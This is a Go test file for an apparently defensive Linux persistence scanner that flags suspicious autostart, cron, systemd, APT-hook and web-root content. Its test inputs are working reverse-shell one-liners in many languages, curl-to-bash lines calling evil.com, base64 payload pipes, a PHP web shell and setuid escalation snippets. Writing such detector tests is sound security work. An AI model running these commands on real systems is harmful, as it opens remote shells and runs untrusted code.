//go:build linux

package modules

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/pathfinder/internal/output"
)

func TestParseDesktopFile_ExtractsFields(t *testing.T) {
	data := []byte("[Desktop Entry]\nType=Application\nExec=/usr/bin/nm-applet\nHidden=false\nNoDisplay=true\n")
	e := parseDesktopFile(data)
	if e.Type != "Application" {
		t.Errorf("Type: got %q, want Application", e.Type)
	}
	if e.Exec != "/usr/bin/nm-applet" {
		t.Errorf("Exec: got %q, want /usr/bin/nm-applet", e.Exec)
	}
	if e.Hidden {
		t.Error("Hidden: got true, want false")
	}
	if !e.NoDisplay {
		t.Error("NoDisplay: got false, want true")
	}
}

func TestParseDesktopFile_OnlyParsesDesktopEntrySection(t *testing.T) {
	data := []byte("[Desktop Action New-Window]\nExec=/usr/bin/evil\n\n[Desktop Entry]\nType=Application\nExec=/usr/bin/nm-applet\n")
	e := parseDesktopFile(data)
	if e.Exec != "/usr/bin/nm-applet" {
		t.Errorf("Exec: got %q — must ignore non-[Desktop Entry] sections", e.Exec)
	}
}

func TestClassifyExec_MalwareDir(t *testing.T) {
	sev, reason := classifyExec("/tmp/evil-payload", false)
	if sev != output.HIGH {
		t.Errorf("sev: want HIGH, got %s", sev)
	}
	if !strings.Contains(reason, "malware staging") {
		t.Errorf("reason: got %q, want substring 'malware staging'", reason)
	}
}

func TestClassifyExec_ShellInlinePayload(t *testing.T) {
	sev, reason := classifyExec("bash -c 'curl http://evil.com | sh'", false)
	if sev != output.HIGH {
		t.Errorf("sev: want HIGH, got %s", sev)
	}
	if !strings.Contains(reason, "inline payload") {
		t.Errorf("reason: got %q, want substring 'inline payload'", reason)
	}
}

func TestClassifyExec_PythonInlinePayload(t *testing.T) {
	sev, _ := classifyExec("python3 -c 'import os; os.system(\"id\")'", false)
	if sev != output.HIGH {
		t.Errorf("sev: want HIGH, got %s", sev)
	}
}

func TestClassifyExec_InlinePayloadNotSubstringMatch(t *testing.T) {
	// "bash -cool" contains "bash -c" as a literal substring; must not be flagged
	sev, _ := classifyExec("bash -cool /path/to/script", false)
	if sev == output.HIGH {
		t.Error("exec value whose flag starts with -c must not trigger inline payload detection")
	}
}

func TestClassifyExec_HiddenComponent(t *testing.T) {
	sev, reason := classifyExec("/home/user/.secretdir/evil", false)
	if sev != output.HIGH {
		t.Errorf("sev: want HIGH, got %s", sev)
	}
	if !strings.Contains(reason, "hidden directory") {
		t.Errorf("reason: got %q, want substring 'hidden directory'", reason)
	}
}

func TestClassifyExec_KnownXDGNotFlagged(t *testing.T) {
	// .config and .local are known-safe XDG dirs; user-dir scan must return INFO not HIGH
	for _, exec := range []string{
		"/home/user/.config/autostart/app.sh",
		"/home/user/.local/share/app/bin",
	} {
		sev, _ := classifyExec(exec, true)
		if sev != output.INFO {
			t.Errorf("exec %q: .config/.local are known XDG dirs, must return INFO not %s", exec, sev)
		}
	}
}

func TestClassifyExec_NonExistentBinary(t *testing.T) {
	// Use a path outside any malware dir that is guaranteed not to exist
	nonExistent := "/usr/local/bin/pathfinder-test-nonexistent-8675309"
	sev, reason := classifyExec(nonExistent, true)
	if sev != output.MEDIUM {
		t.Errorf("sev: want MEDIUM, got %s", sev)
	}
	if !strings.Contains(reason, "non-existent") {
		t.Errorf("reason: got %q, want substring 'non-existent'", reason)
	}
}

func TestClassifyExec_NonExistentBinary_SystemDirIgnored(t *testing.T) {
	// Non-existent binary in system dir (fromUserDir=false) must not be flagged
	nonExistent := "/usr/local/bin/pathfinder-test-nonexistent-8675309"
	sev, _ := classifyExec(nonExistent, false)
	if sev == output.MEDIUM {
		t.Errorf("non-existent binary check must be skipped for system dirs")
	}
}

func TestClassifyExec_CleanUserDir(t *testing.T) {
	sev, _ := classifyExec("/usr/bin/env", true)
	if sev != output.INFO {
		t.Errorf("sev: want INFO for clean user-dir entry, got %s", sev)
	}
}

func TestClassifyExec_CleanSystemDir(t *testing.T) {
	sev, _ := classifyExec("/usr/bin/env", false)
	if sev != "" {
		t.Errorf("sev: want empty (no hit) for clean system-dir entry, got %s", sev)
	}
}

func TestExecBinary_HandlesEnvPrefix(t *testing.T) {
	cases := []struct {
		exec string
		want string
	}{
		{"/usr/bin/nm-applet --sm-disable", "/usr/bin/nm-applet"},
		{"env DISPLAY=:0 /usr/bin/app", "/usr/bin/app"},
		{"bash -c 'evil'", "bash"},
		{"/tmp/evil --arg", "/tmp/evil"},
	}
	for _, c := range cases {
		got := execBinary(c.exec)
		if got != c.want {
			t.Errorf("execBinary(%q): got %q, want %q", c.exec, got, c.want)
		}
	}
}

func TestHasHiddenComponent(t *testing.T) {
	yes := []string{
		"/home/user/.secretdir/evil",
		"/home/user/.hidden/lib/mod.so",
	}
	no := []string{
		"/home/user/.config/autostart/app",
		"/home/user/.local/share/app/bin",
		"/usr/bin/ls",
	}
	for _, p := range yes {
		if !hasHiddenComponent(p) {
			t.Errorf("hasHiddenComponent(%q): want true", p)
		}
	}
	for _, p := range no {
		if hasHiddenComponent(p) {
			t.Errorf("hasHiddenComponent(%q): want false", p)
		}
	}
}

func TestClassifyShellCommand_DevTCP(t *testing.T) {
	sev, reason := classifyShellCommand("/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'")
	if sev != output.HIGH {
		t.Errorf("sev: want HIGH, got %s", sev)
	}
	if reason != "bash TCP/UDP socket redirection" {
		t.Errorf("reason: got %q", reason)
	}
}

func TestClassifyShellCommand_OctalSUID(t *testing.T) {
	cases := []struct {
		cmd   string
		match bool
	}{
		{"chmod 4755 /tmp/evil", true},
		{"chmod 4711 /usr/local/bin/backdoor", true},
		{"chmod 6755 /sbin/exploit", true},
		{"chmod 2000 /tmp/sgid", true},
		{"chmod 755 /usr/bin/tool", false},
		{"chmod 0755 /usr/bin/tool", false},
		{"chmod 644 /etc/passwd", false},
	}
	for _, c := range cases {
		sev, _ := classifyShellCommand(c.cmd)
		got := sev == output.HIGH
		if got != c.match {
			t.Errorf("classifyShellCommand(%q): HIGH=%v, want %v", c.cmd, got, c.match)
		}
	}
}

func TestClassifyShellCommand_DevUDP(t *testing.T) {
	sev, _ := classifyShellCommand("sh -i >& /dev/udp/10.0.0.1/4242 0>&1")
	if sev != output.HIGH {
		t.Errorf("sev: want HIGH, got %s", sev)
	}
}

func TestClassifyShellCommand_InteractiveShell(t *testing.T) {
	sev, reason := classifyShellCommand("bash -i >& /tmp/s 0>&1")
	if sev != output.HIGH {
		t.Errorf("sev: want HIGH, got %s", sev)
	}
	if reason != "interactive reverse shell" {
		t.Errorf("reason: got %q", reason)
	}
}

func TestClassifyShellCommand_NetcatExec(t *testing.T) {
	sev, reason := classifyShellCommand("nc -e /bin/sh 10.0.0.1 4242")
	if sev != output.HIGH {
		t.Errorf("sev: want HIGH, got %s", sev)
	}
	if reason != "netcat exec reverse shell" {
		t.Errorf("reason: got %q", reason)
	}
}

func TestClassifyShellCommand_Mkfifo(t *testing.T) {
	sev, reason := classifyShellCommand("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f")
	if sev != output.HIGH {
		t.Errorf("sev: want HIGH, got %s", sev)
	}
	if reason != "named pipe reverse shell" {
		t.Errorf("reason: got %q", reason)
	}
}

func TestClassifyShellCommand_Socat(t *testing.T) {
	sev, reason := classifyShellCommand("socat tcp-connect:10.0.0.1:4242 exec:/bin/sh,pty,stderr,setsid,sigint,sane")
	if sev != output.HIGH {
		t.Errorf("sev: want HIGH, got %s", sev)
	}
	if reason != "socat reverse shell" {
		t.Errorf("reason: got %q", reason)
	}
}

func TestClassifyShellCommand_DownloadExec(t *testing.T) {
	sev, reason := classifyShellCommand("curl http://evil.com/payload | bash")
	if sev != output.HIGH {
		t.Errorf("sev: want HIGH, got %s", sev)
	}
	if reason != "download-and-execute payload" {
		t.Errorf("reason: got %q", reason)
	}
}

func TestClassifyShellCommand_Base64Pipe(t *testing.T) {
	sev, reason := classifyShellCommand("echo aGVsbG8= | base64 -d | bash")
	if sev != output.HIGH {
		t.Errorf("sev: want HIGH, got %s", sev)
	}
	if reason != "base64-encoded payload execution" {
		t.Errorf("reason: got %q", reason)
	}
}

func TestClassifyShellCommand_RubyTCPSocket(t *testing.T) {
	sev, reason := classifyShellCommand("ruby -rsocket -e 'f=TCPSocket.open(\"10.0.0.1\",4242).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'")
	if sev != output.HIGH {
		t.Errorf("sev: want HIGH, got %s", sev)
	}
	if reason != "Ruby TCP socket reverse shell" {
		t.Errorf("reason: got %q", reason)
	}
}

func TestClassifyShellCommand_PHPFsockopen(t *testing.T) {
	sev, reason := classifyShellCommand("php -r '$sock=fsockopen(\"10.0.0.1\",4242);exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
	if sev != output.HIGH {
		t.Errorf("sev: want HIGH, got %s", sev)
	}
	if reason != "PHP socket reverse shell" {
		t.Errorf("reason: got %q", reason)
	}
}

func TestClassifyShellCommand_PythonPty(t *testing.T) {
	sev, reason := classifyShellCommand("python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
	if sev != output.HIGH {
		t.Errorf("sev: want HIGH, got %s", sev)
	}
	if reason != "Python pty reverse shell" {
		t.Errorf("reason: got %q", reason)
	}
}

func TestClassifyShellCommand_PythonSocket(t *testing.T) {
	sev, reason := classifyShellCommand("python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.0.0.1\",4242));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'")
	if sev != output.HIGH {
		t.Errorf("sev: want HIGH, got %s", sev)
	}
	if reason != "Python socket reverse shell" {
		t.Errorf("reason: got %q", reason)
	}
}

func TestClassifyShellCommand_PerlSocket(t *testing.T) {
	sev, reason := classifyShellCommand("perl -e 'use Socket;$i=\"10.0.0.1\";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");}'")
	if sev != output.HIGH {
		t.Errorf("sev: want HIGH, got %s", sev)
	}
	if reason != "Perl socket reverse shell" {
		t.Errorf("reason: got %q", reason)
	}
}

func TestClassifyShellCommand_AwkTCP(t *testing.T) {
	sev, reason := classifyShellCommand("awk 'BEGIN{s=\"/inet/tcp/0/10.0.0.1/4242\";while(42){print \"sh>\" |& s;s |& getline c;while((c |& getline)>0)print |& s;close(c)}}'")
	if sev != output.HIGH {
		t.Errorf("sev: want HIGH, got %s", sev)
	}
	if reason != "awk TCP reverse shell" {
		t.Errorf("reason: got %q", reason)
	}
}

func TestClassifyShellCommand_OpenSSL(t *testing.T) {
	sev, reason := classifyShellCommand("openssl s_client -quiet -connect 10.0.0.1:4242|/bin/bash|openssl s_client -quiet -connect 10.0.0.1:4243")
	if sev != output.HIGH {
		t.Errorf("sev: want HIGH, got %s", sev)
	}
	if reason != "OpenSSL reverse shell" {
		t.Errorf("reason: got %q", reason)
	}
}

func TestClassifyShellCommand_LuaSocket(t *testing.T) {
	sev, reason := classifyShellCommand("lua -e \"require('socket');t=socket.tcp();t:connect('10.0.0.1','4242');os.execute('/bin/sh -i <&3 >&3 2>&3');\"")
	if sev != output.HIGH {
		t.Errorf("sev: want HIGH, got %s", sev)
	}
	if reason != "Lua socket reverse shell" {
		t.Errorf("reason: got %q", reason)
	}
}

func TestClassifyShellCommand_BootPathNotStaging(t *testing.T) {
	cases := []string{
		"image_path=/boot/vmlinuz-$version",
		"grub-install --boot-directory=/boot/grub /dev/sda",
		"rm -f /boot/grub/grub.cfg",
		"if [ -e /boot/grub/grub.cfg ] && [ -x \"$(which update-grub)\" ]; then",
		"rm -f /boot/efi/EFI/ubuntu/fwupd.efi",
	}
	for _, cmd := range cases {
		sev, _ := classifyShellCommand(cmd)
		if sev != "" {
			t.Errorf("cmd %q: /boot/ paths must not trigger staging detection, got sev=%s", cmd, sev)
		}
	}
}

func TestClassifyShellCommand_StagingPathsStillDetected(t *testing.T) {
	cases := []string{
		"curl http://evil.com/payload -o /tmp/dropper && chmod +x /tmp/dropper",
		"cp backdoor /var/tmp/svc",
		"TMP_CANDIDATE_CACHE_PATH=\"/tmp/ubuntu-advantage/candidate-version\"",
		"nohup /dev/shm/backdoor &",
	}
	for _, cmd := range cases {
		sev, _ := classifyShellCommand(cmd)
		if sev == "" {
			t.Errorf("cmd %q: /tmp/ and /var/tmp/ paths must still trigger staging detection", cmd)
		}
	}
}

func TestClassifyShellCommand_StagingPath(t *testing.T) {
	sev, reason := classifyShellCommand("/tmp/evil_binary --args")
	if sev != output.HIGH {
		t.Errorf("sev: want HIGH, got %s", sev)
	}
	if reason != "command references staging/volatile path" {
		t.Errorf("reason: got %q", reason)
	}
}

func TestClassifyShellCommand_PipeToShell(t *testing.T) {
	sev, reason := classifyShellCommand("cat /etc/passwd | sh")
	if sev != output.MEDIUM {
		t.Errorf("sev: want MEDIUM, got %s", sev)
	}
	if reason != "pipe-to-shell execution" {
		t.Errorf("reason: got %q", reason)
	}
}

func TestClassifyShellCommand_Clean(t *testing.T) {
	cases := []string{
		"cd / && run-parts --report /etc/cron.hourly",
		"/usr/bin/find /home -name '*.log' -mtime +30 -delete",
		"test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )",
		"",
	}
	for _, cmd := range cases {
		sev, _ := classifyShellCommand(cmd)
		if sev != "" {
			t.Errorf("clean cmd %q: want empty severity, got %s", cmd, sev)
		}
	}
}

func TestClassifyShellCommand_CaseInsensitive(t *testing.T) {
	sev, _ := classifyShellCommand("/BIN/BASH -C 'SH -I >& /DEV/TCP/10.0.0.1/4242 0>&1'")
	if sev != output.HIGH {
		t.Errorf("sev: want HIGH, got %s — must match case-insensitively", sev)
	}
}

func TestExtractCronCommand_SystemCrontab(t *testing.T) {
	// /etc/crontab format: min hour dom month dow username command
	line := "* * * * * root /bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'"
	got := extractCronCommand(line, true)
	want := "/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'"
	if got != want {
		t.Errorf("got %q, want %q", got, want)
	}
}

func TestExtractCronCommand_UserCrontab(t *testing.T) {
	// /var/spool/cron format: min hour dom month dow command
	line := "* * * * * /bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'"
	got := extractCronCommand(line, false)
	want := "/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'"
	if got != want {
		t.Errorf("got %q, want %q", got, want)
	}
}

func TestExtractCronCommand_AtSyntax(t *testing.T) {
	line := "@reboot /tmp/evil"
	got := extractCronCommand(line, true)
	if got != "/tmp/evil" {
		t.Errorf("got %q, want /tmp/evil", got)
	}
}

func TestExtractCronCommand_AtSyntaxWithUsernameField(t *testing.T) {
	// /etc/crontab allows @reboot username command
	got := extractCronCommand("@reboot root /tmp/evil", true)
	if got != "/tmp/evil" {
		t.Errorf("@syntax hasUser=true: got %q, want /tmp/evil", got)
	}
}

func TestExtractCronCommand_AtSyntaxNoUsernameField(t *testing.T) {
	// user crontab: @reboot command (no username)
	got := extractCronCommand("@reboot /tmp/evil", false)
	if got != "/tmp/evil" {
		t.Errorf("@syntax hasUser=false: got %q, want /tmp/evil", got)
	}
}

func TestExtractCronCommand_AtSyntaxSingleToken_UserDir(t *testing.T) {
	// @reboot with only the @token and nothing else: must return ""
	got := extractCronCommand("@reboot", true)
	if got != "" {
		t.Errorf("@syntax only token hasUser=true: got %q, want empty", got)
	}
}

func TestExtractCronCommand_Comment(t *testing.T) {
	if got := extractCronCommand("# this is a comment", true); got != "" {
		t.Errorf("comment line: want empty, got %q", got)
	}
}

func TestExtractCronCommand_Empty(t *testing.T) {
	if got := extractCronCommand("", true); got != "" {
		t.Errorf("empty: want empty, got %q", got)
	}
}

func TestExtractCronCommand_TooFewFields(t *testing.T) {
	if got := extractCronCommand("* * * * *", true); got != "" {
		t.Errorf("too few fields (hasUser=true): want empty, got %q", got)
	}
	if got := extractCronCommand("* * * * *", false); got != "" {
		t.Errorf("too few fields (hasUser=false): want empty, got %q", got)
	}
}

func TestIsKnownSystemdGenerator_SystemdPrefix(t *testing.T) {
	cases := []string{"systemd-fstab-generator", "systemd-gpt-auto-generator", "systemd-cryptsetup-generator"}
	for _, name := range cases {
		if !isKnownSystemdGenerator(name) {
			t.Errorf("%q: want known=true", name)
		}
	}
}

func TestIsKnownSystemdGenerator_KnownPackages(t *testing.T) {
	cases := []string{"snapd-generator", "netplan", "openvpn-generator", "friendly-recovery", "makecon"}
	for _, name := range cases {
		if !isKnownSystemdGenerator(name) {
			t.Errorf("%q: want known=true", name)
		}
	}
}

func TestClassifyShellCommand_SystemdExecStart(t *testing.T) {
	exec := "/usr/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1'"
	sev, reason := classifyShellCommand(exec)
	if sev != output.HIGH {
		t.Errorf("sev: want HIGH, got %s", sev)
	}
	if reason != "bash TCP/UDP socket redirection" {
		t.Errorf("reason: got %q", reason)
	}
}

func TestIsKnownSystemdGenerator_Unknown(t *testing.T) {
	cases := []string{"generator", "evil", "backdoor", "xmrig", ""}
	for _, name := range cases {
		if isKnownSystemdGenerator(name) {
			t.Errorf("%q: want known=false", name)
		}
	}
}

func TestClassifyShellCommand_PerlSetuid(t *testing.T) {
	sev, reason := classifyShellCommand("use POSIX; POSIX::setuid(0); exec('/bin/bash')")
	if sev != output.HIGH {
		t.Errorf("sev: want HIGH, got %s", sev)
	}
	if reason != "Perl capability-abuse setuid escalation" {
		t.Errorf("reason: got %q", reason)
	}
}

func TestClassifyShellCommand_PerlSetuid_NoExec_NotFlagged(t *testing.T) {
	sev, _ := classifyShellCommand("POSIX::setuid(1000)")
	if sev == output.HIGH {
		t.Error("POSIX::setuid without exec token must not be HIGH")
	}
}

func TestClassifyShellCommand_PythonSetuid(t *testing.T) {
	sev, reason := classifyShellCommand("import posix; posix.setuid(0)")
	if sev != output.HIGH {
		t.Errorf("sev: want HIGH, got %s", sev)
	}
	if reason != "Python capability-abuse setuid escalation" {
		t.Errorf("reason: got %q", reason)
	}
}

func TestClassifyShellCommand_OsSetuid(t *testing.T) {
	sev, reason := classifyShellCommand("os.setuid(0); os.system('/bin/sh')")
	if sev != output.HIGH {
		t.Errorf("sev: want HIGH, got %s", sev)
	}
	if reason != "Go/Ruby setuid(0) escalation" {
		t.Errorf("reason: got %q", reason)
	}
}

func TestClassifyShellCommand_CapSetuid_Medium(t *testing.T) {
	sev, reason := classifyShellCommand("setcap cap_setuid+ep /usr/bin/python3")
	if sev != output.MEDIUM {
		t.Errorf("sev: want MEDIUM, got %s", sev)
	}
	if reason != "capability string embedded in script" {
		t.Errorf("reason: got %q", reason)
	}
}

func TestRecentlyModified_NewFile(t *testing.T) {
	f, err := os.CreateTemp("", "pathfinder-rmod-*")
	if err != nil {
		t.Fatal(err)
	}
	f.Close()
	defer os.Remove(f.Name())
	if !recentlyModified(f.Name(), 1) {
		t.Error("just-created file must be recently modified within 1h")
	}
}

func TestRecentlyModified_MissingFile(t *testing.T) {
	if recentlyModified("/no/such/file/pathfinder-rmod-test", 72) {
		t.Error("missing file must return false")
	}
}

func TestPersistenceStagingSharedObjects_FindsSO(t *testing.T) {
	dir := t.TempDir()
	soPath := filepath.Join(dir, "evil.so")
	if err := os.WriteFile(soPath, []byte("ELF"), 0644); err != nil {
		t.Fatal(err)
	}
	found := scanDirForSharedObjects(dir)
	if len(found) != 1 {
		t.Fatalf("want 1 result, got %d", len(found))
	}
	if found[0] != soPath {
		t.Errorf("got %q", found[0])
	}
}

func TestPersistenceStagingSharedObjects_IgnoresNonSO(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "script.sh"), []byte("#!/bin/bash"), 0755); err != nil {
		t.Fatal(err)
	}
	found := scanDirForSharedObjects(dir)
	if len(found) != 0 {
		t.Errorf("want 0 results, got %d", len(found))
	}
}

func TestScanDirForSharedObjects_FindsSOInSubdir(t *testing.T) {
	dir := t.TempDir()
	sub := filepath.Join(dir, ".hidden")
	if err := os.Mkdir(sub, 0755); err != nil {
		t.Fatal(err)
	}
	soPath := filepath.Join(sub, "evil.so")
	if err := os.WriteFile(soPath, []byte("ELF"), 0644); err != nil {
		t.Fatal(err)
	}
	found := scanDirForSharedObjects(dir)
	if len(found) != 1 {
		t.Fatalf("want 1 result from subdir, got %d", len(found))
	}
	if found[0] != soPath {
		t.Errorf("got %q, want %q", found[0], soPath)
	}
}

func TestScanDirForSharedObjects_DoesNotDescendTwoLevels(t *testing.T) {
	dir := t.TempDir()
	deep := filepath.Join(dir, "a", "b")
	if err := os.MkdirAll(deep, 0755); err != nil {
		t.Fatal(err)
	}
	soPath := filepath.Join(deep, "deep.so")
	if err := os.WriteFile(soPath, []byte("ELF"), 0644); err != nil {
		t.Fatal(err)
	}
	found := scanDirForSharedObjects(dir)
	if len(found) != 0 {
		t.Errorf("depth-2 .so must not be found, got %d: %v", len(found), found)
	}
}

func TestExtractAPTHookCommands_PreInvoke(t *testing.T) {
	conf := `APT::Update::Pre-Invoke {"curl http://evil.com | bash"};`
	cmds := extractAPTHookCommands(conf)
	if len(cmds) != 1 || cmds[0] != "curl http://evil.com | bash" {
		t.Errorf("got %v", cmds)
	}
}

func TestExtractAPTHookCommands_DPkgPostInvoke(t *testing.T) {
	conf := `DPkg::Post-Invoke {"/tmp/backdoor"};`
	cmds := extractAPTHookCommands(conf)
	if len(cmds) != 1 || cmds[0] != "/tmp/backdoor" {
		t.Errorf("got %v", cmds)
	}
}

func TestExtractAPTHookCommands_NoMatch(t *testing.T) {
	conf := `APT::Periodic::Update-Package-Lists "1";`
	cmds := extractAPTHookCommands(conf)
	if len(cmds) != 0 {
		t.Errorf("want empty, got %v", cmds)
	}
}

func TestFindGitHooksDirs_FindsHooksDir(t *testing.T) {
	root := t.TempDir()
	hooksDir := filepath.Join(root, ".git", "hooks")
	if err := os.MkdirAll(hooksDir, 0755); err != nil {
		t.Fatal(err)
	}
	found := findGitHooksDirs(root, 1)
	if len(found) != 1 || found[0] != hooksDir {
		t.Errorf("got %v, want [%s]", found, hooksDir)
	}
}

func TestFindGitHooksDirs_DepthLimit(t *testing.T) {
	root := t.TempDir()
	hooksDir := filepath.Join(root, "a", "b", ".git", "hooks")
	if err := os.MkdirAll(hooksDir, 0755); err != nil {
		t.Fatal(err)
	}
	found := findGitHooksDirs(root, 1)
	if len(found) != 0 {
		t.Errorf("depth limit violated: found %v", found)
	}
}

func TestParseGitConfigValues_PagerEditor(t *testing.T) {
	conf := "[core]\n\tpager = /tmp/evil-pager\n\teditor = vim\n"
	vals := parseGitConfigValues(conf, "pager", "editor")
	if vals[0] != "/tmp/evil-pager" {
		t.Errorf("pager: got %q", vals[0])
	}
	if vals[1] != "vim" {
		t.Errorf("editor: got %q", vals[1])
	}
}

func TestClassifyKernelModuleTaint_OETaint_Flagged(t *testing.T) {
	allowlist := map[string]bool{"nvidia": true, "vboxdrv": true}
	sev, label, flagged := classifyKernelModuleTaint("custom_lkm", "(OE)", allowlist)
	if !flagged {
		t.Fatal("want flagged=true for OE taint on unknown module")
	}
	if sev != output.HIGH {
		t.Errorf("sev: want HIGH, got %s", sev)
	}
	if label != "Out-of-tree or unsigned kernel module" {
		t.Errorf("label: got %q", label)
	}
}

func TestClassifyKernelModuleTaint_Allowlisted_NotFlagged(t *testing.T) {
	allowlist := map[string]bool{"nvidia": true}
	_, _, flagged := classifyKernelModuleTaint("nvidia", "(OE)", allowlist)
	if flagged {
		t.Error("want flagged=false for allowlisted DKMS module")
	}
}

func TestClassifyKernelModuleTaint_CleanModule_NotFlagged(t *testing.T) {
	allowlist := map[string]bool{}
	_, _, flagged := classifyKernelModuleTaint("ext4", "-", allowlist)
	if flagged {
		t.Error("want flagged=false for clean module")
	}
}

func TestClassifyKernelModuleTaint_Severity(t *testing.T) {
	none := map[string]bool{}
	if sev, _, ok := classifyKernelModuleTaint("m", "(E)", none); !ok || sev != output.HIGH {
		t.Errorf("E taint: got sev=%s ok=%v, want HIGH true", sev, ok)
	}
	if sev, _, ok := classifyKernelModuleTaint("m", "(O)", none); !ok || sev != output.MEDIUM {
		t.Errorf("O taint: got sev=%s ok=%v, want MEDIUM true", sev, ok)
	}
	if sev, _, ok := classifyKernelModuleTaint("m", "(OE)", none); !ok || sev != output.HIGH {
		t.Errorf("OE taint: got sev=%s ok=%v, want HIGH true", sev, ok)
	}
	if _, _, ok := classifyKernelModuleTaint("m", "(P)", none); ok {
		t.Error("P taint: want ok=false")
	}
	if _, _, ok := classifyKernelModuleTaint("nv", "(E)", map[string]bool{"nv": true}); ok {
		t.Error("allowlisted: want ok=false")
	}
}

func TestIsDKMSPath_UpdatesDir(t *testing.T) {
	if !isDKMSPath("/lib/modules/5.15.0-139-generic/updates/dkms/vboxsf.ko") {
		t.Error("want true for updates/ subdir")
	}
	if isDKMSPath("/lib/modules/5.15.0-139-generic/kernel/drivers/custom_lkm.ko") {
		t.Error("want false for kernel/ subdir")
	}
}

func TestIsWebShellExtension_PHP(t *testing.T) {
	if !isWebShellExtension("shell.php") {
		t.Error("want true for .php")
	}
	if !isWebShellExtension("cmd.py") {
		t.Error("want true for .py")
	}
	if isWebShellExtension("index.html") {
		t.Error("want false for .html")
	}
}

func TestIsWebShellExtension_SH(t *testing.T) {
	if !isWebShellExtension("backdoor.sh") {
		t.Error("want true for .sh")
	}
}

func TestDiscoverWebRootsFromProcesses_ReturnsStaticRootsIfNoProcs(t *testing.T) {
	roots := discoverWebRoots(nil) // nil []*procfs.Process → static roots only
	found := false
	for _, r := range roots {
		if strings.HasPrefix(r, "/var/www") {
			found = true
		}
	}
	if !found {
		t.Error("want /var/www in static web roots")
	}
}

func TestScanWebRootForShells_DetectsPhpReverseShell(t *testing.T) {
	dir := t.TempDir()
	shellContent := `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'");?>`
	if err := os.WriteFile(filepath.Join(dir, "evil.php"), []byte(shellContent), 0644); err != nil {
		t.Fatal(err)
	}
	hits, _ := scanWebRootForShells(dir, "", nil, time.Time{})
	if len(hits) != 1 {
		t.Fatalf("want 1 hit, got %d", len(hits))
	}
	if hits[0].sev != output.HIGH {
		t.Errorf("sev: want HIGH, got %s", hits[0].sev)
	}
}

func TestScanWebRootForShells_IgnoresLargeFiles(t *testing.T) {
	dir := t.TempDir()
	large := make([]byte, 2*1024*1024) // 2MB > 1MB cap
	if err := os.WriteFile(filepath.Join(dir, "big.php"), large, 0644); err != nil {
		t.Fatal(err)
	}
	hits, _ := scanWebRootForShells(dir, "", nil, time.Time{})
	if len(hits) != 0 {
		t.Errorf("want 0 hits for oversized file, got %d", len(hits))
	}
}

func TestScanWebRootForShells_SkipsDpkgOwnedFile(t *testing.T) {
	dir := t.TempDir()
	phpPath := filepath.Join(dir, "index.php")
	content := `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'");?>`
	if err := os.WriteFile(phpPath, []byte(content), 0644); err != nil {
		t.Fatal(err)
	}
	ownedFiles := map[string]bool{phpPath: true}
	hits, _ := scanWebRootForShells(dir, "", ownedFiles, time.Time{})
	if len(hits) != 0 {
		t.Errorf("dpkg-owned file must be skipped even with malicious content, got %d hits", len(hits))
	}
}

func TestScanWebRootForShells_NilOwnedFiles_StillDetects(t *testing.T) {
	dir := t.TempDir()
	phpPath := filepath.Join(dir, "evil.php")
	content := `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'");?>`
	if err := os.WriteFile(phpPath, []byte(content), 0644); err != nil {
		t.Fatal(err)
	}
	hits, _ := scanWebRootForShells(dir, "", nil, time.Time{})
	if len(hits) != 1 {
		t.Fatalf("nil ownedFiles must not skip any files, want 1 hit, got %d", len(hits))
	}
	if hits[0].sev != output.HIGH {
		t.Errorf("sev: want HIGH, got %s", hits[0].sev)
	}
}

func TestScanWebRootForShells_TimedOut_ReturnsTimedOutTrue(t *testing.T) {
	dir := t.TempDir()
	shellContent := `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'");?>`
	if err := os.WriteFile(filepath.Join(dir, "evil.php"), []byte(shellContent), 0644); err != nil {
		t.Fatal(err)
	}
	// Deadline already expired: forces immediate SkipAll.
	past := time.Now().Add(-1 * time.Second)
	hits, timedOut := scanWebRootForShells(dir, "", nil, past)
	if !timedOut {
		t.Error("want timedOut=true for an expired deadline")
	}
	if len(hits) != 0 {
		t.Errorf("want 0 hits when deadline is already expired, got %d", len(hits))
	}
}

func TestBuildDpkgOwnedFilesFrom_ReadsListFiles(t *testing.T) {
	dir := t.TempDir()
	content := "/lib/x86_64-linux-gnu/security/pam_unix.so\n/lib/x86_64-linux-gnu/security/pam_env.so\n"
	if err := os.WriteFile(filepath.Join(dir, "libpam-modules.list"), []byte(content), 0644); err != nil {
		t.Fatal(err)
	}
	owned := buildDpkgOwnedFilesFrom(testAtCtx(t), dir)
	if !owned["/lib/x86_64-linux-gnu/security/pam_unix.so"] {
		t.Error("want pam_unix.so in owned set")
	}
	if !owned["/lib/x86_64-linux-gnu/security/pam_env.so"] {
		t.Error("want pam_env.so in owned set")
	}
}

func TestBuildDpkgOwnedFilesFrom_IgnoresNonListFiles(t *testing.T) {
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "pkg.md5sums"), []byte("/usr/bin/foo\n"), 0644)
	owned := buildDpkgOwnedFilesFrom(testAtCtx(t), dir)
	if owned["/usr/bin/foo"] {
		t.Error("want .md5sums files ignored — only .list files should be read")
	}
}

